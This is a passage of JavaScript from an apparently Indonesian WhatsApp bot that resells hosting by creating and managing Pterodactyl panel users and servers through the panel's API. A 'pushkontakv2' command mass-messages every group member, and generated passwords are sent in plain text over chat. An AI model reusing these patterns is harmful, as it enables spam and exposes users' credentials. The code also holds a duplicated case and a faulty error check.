"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
ramz.sendMessage(from, { text: `*SUCCESSFULLY ADD USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL* ${tanggal}\n\n*Password telah dikirim ke @${nomornya.split('@')[0]}*\n${nomornya}`, mentions: [nomornya]}, { quoted: msg })
ramz.sendMessage(nomornya, { text: `*DONE PANEL BY MiMiXd Solo*\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL:* ${tanggal}\n-----------------------------\n*PASSWORD:* ${psswd}\n-----------------------------\n*LOGIN:* ${host}\n\n*NOTE*\n_*Bot* atau *Ramaa* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })

let sections = [{
title: "-- LIST HARGA PANEL --",
rows: [
{ title: '📮 RAM 1GB CPU 25%', rowId: prefix+`addsrv ${username} js,${res.attributes.id},${serverCreate.eggId},1,1024,1024,25`, description: 'Create Server' },
{ title: '📮 RAM 2GB CPU 50%', rowId: prefix+`addsrv ${username} js,${res.attributes.id},${serverCreate.eggId},1,2094,2094,50`, description: 'Create Server' },
{ title: '📮 RAM 3GB CPU 75%', rowId: prefix+`addsrv ${username} js,${res.attributes.id},${serverCreate.eggId},1,3094,3094,75`, description: 'Create Server' },
{ title: '📮 RAM 4GB CPU 100%', rowId: prefix+`addsrv ${username} js,${res.attributes.id},${serverCreate.eggId},1,4094,4094,100`, description: 'Create Server' },
{ title: '📮 RAM 5GB CPU 130%', rowId: prefix+`addsrv ${username} js,${res.attributes.id},${serverCreate.eggId},1,5000,5000,130`, description: 'Create Server' },
{ title: '📮 RAM 6GB CPU 155%', rowId: prefix+`addsrv ${username} js,${res.attributes.id},${serverCreate.eggId},1,6000,6000,155`, description: 'Create Server' },
{ title: '📮 RAM 7GB CPU 185%', rowId: prefix+`addsrv ${username} js,${res.attributes.id},${serverCreate.eggId},1,7000,7000,185`, description: 'Create Server' },
{ title: '📮 RAM UNLIMITED CPU UNLIMITED%', rowId: prefix+`addsrv ${username} js,${res.attributes.id},${serverCreate.eggId},1,0,0,0`, description: 'Create Server' }
]
}]
let templateMessage = {
text: 'Silahkan Pilih Memory Server Yang Otomatis Lagsung Jadi',
footer: `𝙋𝙖𝙣𝙚𝙡 <> 𝙃𝙤𝙨𝙩`,
title: '*CREATE SERVER OTOMATIS*',
buttonText: 'Click Here',
sections
}
ramz.sendMessage(from, templateMessage, { quoted: msg })
}
break
case 'listusr':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let page = q ? q : '1'
let f = await fetch(host + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let res = await f.json();
let users = res.data
let sections = []
let teks = `*JUMLAH USER: ${res.meta.pagination.count}\n`
for (let user of users) {
let u = user.attributes
teks += `\n*USERNAME:* ${u.username}\n*ID:* ${u.id}\n*EMAIL:* ${u.email}\n*IS ADMIN:* ${u.root_admin}\n`
}
teks += `\n\nUntuk melihat detail server silahkan ketik *#detusr*`
await ramz.sendMessage(from, {
text: teks,
footer: `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`
}, { quoted: fkontak })
}
break
case 'detusr':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
if (!q) return reply(`Ex : ${prefix+command} userId\n\nContoh :\n${prefix+command} 1`)
let f = await fetch(host + "/api/application/users/" + q, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let res = await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply(`*${res.attributes.username.toUpperCase()} USER DETAILS*\n\n*ID:* ${res.attributes.id}\n*USERNAME:* ${res.attributes.username}\n*EMAIL:* ${res.attributes.email}\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n*LANGUAGE:* ${res.attributes.language}\n*IS ADMIN:* ${res.attributes.root_admin}\n*IS 2FA:* ${res.attributes["2fa"]}\n*TANGGAL* ${tanggal}\n*UPDATE AT:* ${res.attributes.updated_at}\n*UUID:* ${res.attributes.uuid}`)
}
break

case 'addsrv':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let name = s[0]
let userId = s[1]
let eggId = s[2]
let locId = s[3]
let memory = s[4]
let disk = s[5]
let cpu = s[6]
if (!name) return reply(`Ex : ${prefix+command} name,userId,eggId,locationId,ram,disk,cpu\n\nContoh :\n${prefix+command} Example,1,15,1,1024,10240,100`)
if (!userId) return reply(`Ex : ${prefix+command} name,userId,eggId,locationId,ram,disk,cpu\n\nContoh :\n${prefix+command} Example,1,15,1,1024,10240,100`)
if (!eggId) return reply(`Ex : ${prefix+command} name,userId,eggId,locationId,ram,disk,cpu\n\nContoh :\n${prefix+command} Example,1,15,1,1024,10240,100`)
if (!locId) return reply(`Ex : ${prefix+command} name,userId,eggId,locationId,ram,disk,cpu\n\nContoh :\n${prefix+command} Example,1,15,1,1024,10240,100`)
if (!memory) return reply(`Ex : ${prefix+command} name,userId,eggId,locationId,ram,disk,cpu\n\nContoh :\n${prefix+command} Example,1,15,1,1024,10240,100`)
if (!disk) return reply(`Ex : ${prefix+command} name,userId,eggId,locationId,ram,disk,cpu\n\nContoh :\n${prefix+command} Example,1,15,1,1024,10240,100`)
if (!cpu) return reply(`Ex : ${prefix+command} name,userId,eggId,locationId,ram,disk,cpu\n\nContoh :\n${prefix+command} Example,1,15,1,1024,10240,100`)
let f1 = await fetch(host + "/api/application/nests/" + serverCreate.nestId + "/eggs/" + eggId, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let data = await f1.json();
let eggs = data.attributes

let f = await fetch(host + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key,
},
"body": JSON.stringify({
"name": name,
"description": "",
"user": parseInt(userId),
"egg": parseInt(eggId),
"docker_image": eggs.docker_image,
"startup": eggs.startup,
"environment": serverCreate.eggs.environment,
"limits": {
"memory": memory,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": serverCreate.limits.db,
"backups": serverCreate.limits.backups,
"allocations": serverCreate.limits.allocation
},
deploy: {
locations: [parseInt(locId)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ADD SERVER*\n\n*TYPE: server*\n\n*NAME:* ${res.attributes.name}\n-----------------------------\n*ID:* ${res.attributes.id}\n-----------------------------\n*IDENTIFIER:* ${res.attributes.identifier}\n-----------------------------\n*UUID:* ${res.attributes.uuid}\n-----------------------------\n*RAM:* ${res.attributes.limits.memory === 0 ? 'UNLIMITED' : res.attributes.limits.memory} MB\n-----------------------------\n*DISK:* ${res.attributes.limits.disk === 0 ? 'UNLIMITED' : res.attributes.limits.disk} MB\n-----------------------------\n*CPU:* ${res.attributes.limits.cpu === 0 ? 'UNLIMITED' : res.attributes.limits.cpu}%\n-----------------------------\n*TANGGAL* ${tanggal}`)
}
break
 case 'listadmin':{
if (!isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let page = q ? q : '1'
let f = await fetch(host + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let res = await f.json();
let users = res.data
let sections = []
let teks = `*MENAMPILKAN USER ADMIN*\n\n`
for (let user of users) {
let u = user.attributes;
if (u.root_admin) {
teks += `\n*ID:* ${u.id}\n*USERNAME:* ${u.username}\n*EMAIL*: ${u.email}\n*STATUS:* ADMIN\n`
}
}
teks += `\n\nUntuk melihat detail User silahkan ketik *#detusr*`
await ramz.sendMessage(from, {
text: teks,
footer: `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`
}, { quoted: fkontak })
}
break
case 'delsrv':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
if (!q) return reply(`Ex : ${prefix+command} serverId\n\nContoh :\n${prefix+command} 9`)
let f = await fetch(host + "/api/application/servers/" + q, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break

case 'listsrv': {
if ( !isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let page = q ? q : '1'
let f = await fetch(host + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let res = await f.json();
let servers = res.data
let sections = []
let teks = `*JUMLAH SERVER: ${res.meta.pagination.count}*`
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(host + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.c_api_key 
}
})
let data = await f3.json();
teks += `\n\n*NAME:* ${s.name}\n*ID:* ${s.id}\n*STATUS:* ${data.attributes ? data.attributes.current_state : s.status}\n`
}
teks += `\n\nUntuk melihat detail server silahkan ketik *#detsrv*`
await ramz.sendMessage(from, {text: teks}, {quoted: fkontak})
}
break
case 'delsrv':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
if (!q) return reply(`Ex : ${prefix+command} serverId\n\nContoh :\n${prefix+command} 9`)
let f = await fetch(host + "/api/application/servers/" + q, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case 'detsrv': {
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
if (!q) return reply(`Ex : ${prefix+command} serverId\n\nContoh :\n${prefix+command} 1`)
let f = await fetch(host + "/api/application/servers/" + q, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let res = await f.json();
if (res.errors) return reply('*SERVER NOT FOUND*')
let s = res.attributes
let f2 = await fetch(host + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.c_api_key
}
})
let data = await f2.json();
let t = data.attributes
reply(`*${s.name.toUpperCase()} SERVER DETAILS*\n\n*STATUS:* ${t.current_state}\n\n*ID:* ${s.id}\n-----------------------------\n*UUID:* ${s.uuid}\n-----------------------------\n*NAME:* ${s.name}\n-----------------------------\n*DESCRIPTION:* ${s.description}\n-----------------------------\n*RAM:* ${await (format(t.resources.memory_bytes)).toString()} / ${s.limits.memory === 0 ? 'UNLIMITED' : s.limits.memory + 'MB'}\n-----------------------------\n*DISK:* ${await (format(t.resources.disk_bytes)).toString()} / ${s.limits.disk === 0 ? 'UNLIMITED' : s.limits.disk + 'MB'}\n-----------------------------\n*CPU:* ${t.resources.cpu_absolute}% / ${s.limits.cpu === 0 ? 'UNLIMITED' : s.limits.cpu + '%'}\n-----------------------------\n*TANGGAL* ${tanggal}\n-----------------------------\n*UPDATED AT:* ${s.updated_at}`)
}
break
case "pushkontakv2":
if (!isRama && !isOwner) return reply(`Khusus Owner`)
if (!msg.isGroup) return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
await reply("Gass Pushkontak")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
ramz.sendMessage(men, { text: text })
await sleep(5000)
}
reply("Succes Tod")
break
case 'updatesrv':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let serverId = s[0]
let memory = s[1]
let disk = s[2]
let cpu = s[3]
if (!serverId) return reply(`Ex : ${prefix+command} serverId,ram,disk,cpu\n\nContoh :\n${prefix+command} 1,1024,10240,100`)
if (!memory) return reply(`Ex : ${prefix+command} serverId,ram,disk,cpu\n\nContoh :\n${prefix+command} 1,1024,10240,100`)
if (!disk) return reply(`Ex : ${prefix+command} serverId,ram,disk,cpu\n\nContoh :\n${prefix+command} 1,1024,10240,100`)
if (!cpu) return reply(`Ex : ${prefix+command} serverId,ram,disk,cpu\n\nContoh :\n${prefix+command} 1,1024,10240,100`)
let f1 = await fetch(host + "/api/application/servers/" + serverId, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let data = await f1.json()

let f = await fetch(host + "/api/application/servers/" + serverId + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
},
"body": JSON.stringify({
"allocation": data.attributes.allocation,
"memory": memory || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": disk || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": serverCreate.limits.db,
"backups": serverCreate.limits.backups,
"allocations": serverCreate.limits.allocation
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*\n\n*TYPE:* ${res.object}\n\n*ID:* ${server.id}\n-----------------------------\n*UUID:* ${server.uuid}\n-----------------------------\n*NAME:* ${server.name}\n-----------------------------\n*DESCRIPTION:* ${server.description}\n-----------------------------\n*RAM:* ${server.limits.memory === 0 ? 'UNLIMITED' : server.limits.memory} MB\n-----------------------------\n*DISK:* ${server.limits.disk === 0 ? 'UNLIMITED' : server.limits.disk} MB\n-----------------------------\n*CPU:* ${server.limits.cpu === 0 ? 'UNLIMITED' : server.limits.cpu}%\n-----------------------------\n*TANGGAL* ${tanggal}\n-----------------------------\n*UPDATED AT:* ${server.updated_at}`)
}
break
case '1gb':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let username = s[0]
let nomor = s[1]
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let psswd = require("crypto").randomBytes(10).toString("hex").toUpperCase()
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(host + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
ramz.sendMessage(from, { text: `*SUCCESSFULLY ADD USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL* ${tanggal}\n\n*Password telah dikirim ke @${nomornya.split('@')[0]}*`, mentions: [nomornya]}, { quoted: msg })
ramz.sendMessage(nomornya, { text: `*DONE PANEL BY MiMiXd Solo*\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL:* ${tanggal}\n-----------------------------\n*PASSWORD:* ${psswd}\n-----------------------------\n*LOGIN:* ${host}\n\n*NOTE*\n_*Bot* atau *MiMiXd Solo* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })

let name = s[0] + `Js` 
let userId = `${res.attributes.id}`
let eggId = `${serverCreate.eggId}`
let locId = `1`
let memory = `1024`
let disk = `1024`
let cpu = `25`
let f1 = await fetch(host + "/api/application/nests/" + serverCreate.nestId + "/eggs/" + eggId, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let data = await f1.json();
let eggs = data.attributes

let f3 = await fetch(host + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key,
},
"body": JSON.stringify({
"name": name,
"description": "",
"user": parseInt(userId),
"egg": parseInt(eggId),
"docker_image": eggs.docker_image,
"startup": eggs.startup,
"environment": serverCreate.eggs.environment,
"limits": {
"memory": memory,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": serverCreate.limits.db,
"backups": serverCreate.limits.backups,
"allocations": serverCreate.limits.allocation
},
deploy: {
locations: [parseInt(locId)],
dedicated_ip: false,
port_range: [],
},
})
})
let rama = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ADD SERVER*\n\n*TYPE: server*\n\n*NAME:* ${rama.attributes.name}\n-----------------------------\n*ID:* ${rama.attributes.id}\n-----------------------------\n*IDENTIFIER:* ${rama.attributes.identifier}\n-----------------------------\n*UUID:* ${rama.attributes.uuid}\n-----------------------------\n*RAM:* ${rama.attributes.limits.memory === 0 ? 'UNLIMITED' : rama.attributes.limits.memory} MB\n-----------------------------\n*DISK:* ${rama.attributes.limits.disk === 0 ? 'UNLIMITED' : rama.attributes.limits.disk} MB\n-----------------------------\n*CPU:* ${rama.attributes.limits.cpu === 0 ? 'UNLIMITED' : rama.attributes.limits.cpu}%\n-----------------------------\n*TANGGAL* ${tanggal}`)
}
break
case '2gb':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let username = s[0]
let nomor = s[1]
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let psswd = require("crypto").randomBytes(10).toString("hex").toUpperCase()
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(host + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
ramz.sendMessage(from, { text: `*SUCCESSFULLY ADD USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL* ${tanggal}\n\n*Password telah dikirim ke @${nomornya.split('@')[0]}*`, mentions: [nomornya]}, { quoted: msg })
ramz.sendMessage(nomornya, { text: `*DONE PANEL BY MiMiXd Solo*\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL:* ${tanggal}\n-----------------------------\n*PASSWORD:* ${psswd}\n-----------------------------\n*LOGIN:* ${host}\n\n*NOTE*\n_*Bot* atau *MiMiXd Solo* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })

let name = s[0] + `Js` 
let userId = `${res.attributes.id}`
let eggId = `${serverCreate.eggId}`
let locId = `1`
let memory = `2048`
let disk = `2048`
let cpu = `50`
let f1 = await fetch(host + "/api/application/nests/" + serverCreate.nestId + "/eggs/" + eggId, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let data = await f1.json();
let eggs = data.attributes

let f3 = await fetch(host + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key,
},
"body": JSON.stringify({
"name": name,
"description": "",
"user": parseInt(userId),
"egg": parseInt(eggId),
"docker_image": eggs.docker_image,
"startup": eggs.startup,
"environment": serverCreate.eggs.environment,
"limits": {
"memory": memory,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": serverCreate.limits.db,
"backups": serverCreate.limits.backups,
"allocations": serverCreate.limits.allocation
},
deploy: {
locations: [parseInt(locId)],
dedicated_ip: false,
port_range: [],
},
})
})
let rama = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ADD SERVER*\n\n*TYPE: server*\n\n*NAME:* ${rama.attributes.name}\n-----------------------------\n*ID:* ${rama.attributes.id}\n-----------------------------\n*IDENTIFIER:* ${rama.attributes.identifier}\n-----------------------------\n*UUID:* ${rama.attributes.uuid}\n-----------------------------\n*RAM:* ${rama.attributes.limits.memory === 0 ? 'UNLIMITED' : rama.attributes.limits.memory} MB\n-----------------------------\n*DISK:* ${rama.attributes.limits.disk === 0 ? 'UNLIMITED' : rama.attributes.limits.disk} MB\n-----------------------------\n*CPU:* ${rama.attributes.limits.cpu === 0 ? 'UNLIMITED' : rama.attributes.limits.cpu}%\n-----------------------------\n*TANGGAL* ${tanggal}`)
}
break
case '3gb':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let username = s[0]
let nomor = s[1]
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let psswd = require("crypto").randomBytes(10).toString("hex").toUpperCase()
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(host + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
ramz.sendMessage(from, { text: `*SUCCESSFULLY ADD USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL* ${tanggal}\n\n*Password telah dikirim ke @${nomornya.split('@')[0]}*`, mentions: [nomornya]}, { quoted: msg })
ramz.sendMessage(nomornya, { text: `*DONE PANEL BY MiMiXd Solo*\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL:* ${tanggal}\n-----------------------------\n*PASSWORD:* ${psswd}\n-----------------------------\n*LOGIN:* ${host}\n\n*NOTE*\n_*Bot* atau *MiMiXd Solo* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })

let name = s[0] + `Js` 
let userId = `${res.attributes.id}`
let eggId = `${serverCreate.eggId}`
let locId = `1`
let memory = `3072`
let disk = `3072`
let cpu = `75`
let f1 = await fetch(host + "/api/application/nests/" + serverCreate.nestId + "/eggs/" + eggId, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
}
})
let data = await f1.json();
let eggs = data.attributes

let f3 = await fetch(host + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key,
},
"body": JSON.stringify({
"name": name,
"description": "",
"user": parseInt(userId),
"egg": parseInt(eggId),
"docker_image": eggs.docker_image,
"startup": eggs.startup,
"environment": serverCreate.eggs.environment,
"limits": {
"memory": memory,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": serverCreate.limits.db,
"backups": serverCreate.limits.backups,
"allocations": serverCreate.limits.allocation
},
deploy: {
locations: [parseInt(locId)],
dedicated_ip: false,
port_range: [],
},
})
})
let rama = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ADD SERVER*\n\n*TYPE: server*\n\n*NAME:* ${rama.attributes.name}\n-----------------------------\n*ID:* ${rama.attributes.id}\n-----------------------------\n*IDENTIFIER:* ${rama.attributes.identifier}\n-----------------------------\n*UUID:* ${rama.attributes.uuid}\n-----------------------------\n*RAM:* ${rama.attributes.limits.memory === 0 ? 'UNLIMITED' : rama.attributes.limits.memory} MB\n-----------------------------\n*DISK:* ${rama.attributes.limits.disk === 0 ? 'UNLIMITED' : rama.attributes.limits.disk} MB\n-----------------------------\n*CPU:* ${rama.attributes.limits.cpu === 0 ? 'UNLIMITED' : rama.attributes.limits.cpu}%\n-----------------------------\n*TANGGAL* ${tanggal}`)
}
break
case '4gb':{
if (!isRama && !isOwner) return reply(`sorry anda sepertinya bukan pemilik bot`)
let s = q.split(',')
let username = s[0]
let nomor = s[1]
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let psswd = require("crypto").randomBytes(10).toString("hex").toUpperCase()
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(host + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + application.api_key
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
ramz.sendMessage(from, { text: `*SUCCESSFULLY ADD USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL* ${tanggal}\n\n*Password telah dikirim ke @${nomornya.split('@')[0]}*`, mentions: [nomornya]}, { quoted: msg })
ramz.sendMessage(nomornya, { text: `*DONE PANEL BY MiMiXd Solo*\n\n*ID:* ${res.attributes.id}\n-----------------------------\n*UUID:* ${res.attributes. uuid}\n-----------------------------\n*USERNAME:* ${res.attributes.username}\n-----------------------------\n*EMAIL:* ${res.attributes.email}\n-----------------------------\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n-----------------------------\n*TANGGAL:* ${tanggal}\n-----------------------------\n*PASSWORD:* ${psswd}\n-----------------------------\n*LOGIN:* ${host}\n\n*NOTE*\n_*Bot* atau *MiMiXd Solo* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\n#TERIMAKASIH` })

let name = s[0] + `Js` 
let userId = `${res.attributes.id}`
let eggId = `${serverCreate.eggId}`
let locId = `1`
let memory = `4098`
let disk = `4098`
let cpu = `100`
let f1 = await fetch(host + "/api/application/nests/" + serverCreate.nestId + "/eggs/" + eggId, {
"method": "GET",
"headers": {
